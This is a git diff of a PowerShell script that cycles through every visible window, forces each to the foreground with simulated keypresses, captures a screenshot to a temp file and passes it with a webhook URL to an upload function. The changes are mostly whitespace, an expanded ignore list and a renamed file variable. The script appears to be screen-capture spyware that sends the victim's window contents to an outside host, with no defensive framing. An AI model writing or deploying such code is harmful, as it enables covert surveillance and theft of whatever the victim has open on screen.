@@ -19,10 +19,10 @@ public class User32 {
 
 $processes = Get-Process | Where-Object { $_.MainWindowTitle -ne "" }
 $mainwindowhandlelist = @()
-$ignorelist =@("TextInputHost","Rainmeter")     
+$ignorelist =@("TextInputHost","Rainmeter","ApplicationFrameHost","SystemSettings")     
 foreach ($process in $processes) {
     $mainWindowHandle = $process.MainWindowHandle       
-    if ($ignorelist -contains $process.ProcessName) {
+    if ($ignorelist -contains $process.ProcessName) {       
         continue        
     }       
     $mainwindowhandlelist += $mainWindowHandle  
@@ -52,14 +52,13 @@ function loopscreenshot{
     foreach ($handle in $handlelist) {
     # Set the window to the foreground
     [User32]::keybd_event(0x09, 0, 0, [UIntPtr]::Zero)  # Tab key
-    Start-Sleep -Milliseconds 50
+    Start-Sleep -Milliseconds 50        
     [User32]::SetForegroundWindow($handle)
-    Start-Sleep -Milliseconds 100           
-    screenshot -hookurl $hookurl -File $File
-    }
-    
-}  
-$hookurl = $hookurl
-$Fileto = "$env:temp\SC.png"
+    Start-Sleep -Milliseconds 100    
+    screenshot -hookurl $hookurl -File $File       
+    }       
 
-loopscreenshot -hookurl $hookurl -File $Fileto -handlelist $mainwindowhandlelist                        
+}  
+$File = "$env:temp\screenshot.png"      
+$hookurl = $hookurl        
+loopscreenshot -hookurl $hookurl -File $File -handlelist $mainwindowhandlelist            
